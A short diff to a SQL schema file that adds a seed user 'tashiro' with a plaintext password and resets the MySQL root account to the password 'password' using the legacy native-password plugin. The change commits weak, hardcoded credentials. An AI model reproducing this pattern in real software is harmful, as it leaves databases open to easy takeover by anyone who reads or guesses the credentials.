@@ -34,3 +34,7 @@ CREATE TABLE `whitelist` (
   PRIMARY KEY (`id`),
   KEY `prefix` (`prefix`)
 );
+
+INSERT INTO users VALUES (NULL, 'tashiro', 'mystrongestpassword', 0, 0, 0, 0, -1, 1, 30, '');
+
+ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';
